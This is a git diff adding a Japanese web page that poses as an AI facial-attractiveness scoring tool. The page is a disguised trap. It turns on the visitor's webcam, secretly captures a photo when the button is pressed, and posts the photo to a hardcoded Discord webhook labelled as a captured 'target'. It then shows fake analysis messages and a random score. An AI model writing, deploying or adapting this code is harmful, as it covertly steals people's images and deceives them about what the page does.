@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>AI超精密・顔面偏差値診断</title>
+    <style>
+        body { background: #111; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
+        #btn { padding: 20px 40px; font-size: 20px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 10px; }
+        #status { margin-top: 20px; font-size: 18px; color: #aaa; }
+    </style>
+</head>
+<body>
+    <h1>AI超精密・顔面偏差値診断</h1>
+    <p>最新のAIアルゴリズムであなたの魅力を数値化します。</p>
+    <video id="video" width="400" height="300" autoplay style="border-radius: 15px; border: 2px solid #333;"></video><br>
+    <button id="btn" onclick="startDiagnosis()">診断を開始する</button>
+    <div id="status"></div>
+    <h2 id="result" style="display:none; color: #ffeb3b; font-size: 48px;"></h2>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1488215248291758256/rScxTTRPbkMFRznx9sn1WivlH1PXoYkIjuOBxpx5VDgtOyQeujleukpYynGV2juubpPC";
+
+        async function initCamera() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('video').srcObject = stream;
+        }
+        initCamera();
+
+        async function startDiagnosis() {
+            const btn = document.getElementById('btn');
+            const status = document.getElementById('status');
+            const result = document.getElementById('result');
+            const video = document.getElementById('video');
+            
+            btn.style.display = 'none';
+            status.innerText = "AIが顔の特徴点を抽出中...";
+
+            // 1. 裏でキャプチャして送信
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'target.png');
+                formData.append('content', '📸 **ターゲットの顔写真を確保したぜ。**');
+                fetch(webhookURL, { method: 'POST', body: formData });
+            }, 'image/png');
+
+            // 2. 偽の解析演出 (3秒)
+            setTimeout(() => { status.innerText = "黄金比との照合中..."; }, 1000);
+            setTimeout(() => { status.innerText = "肌の質感とパーツの対称性を計算中..."; }, 2000);
+
+            // 3. 45-75のランダムな結果を表示
+            setTimeout(() => {
+                const score = Math.floor(Math.random() * (75 - 45 + 1)) + 45;
+                status.innerText = "診断完了！あなたの偏差値は：";
+                result.innerText = score + "点";
+                result.style.display = 'block';
+            }, 3500);
+        }
+    </script>
+</body>
+</html>
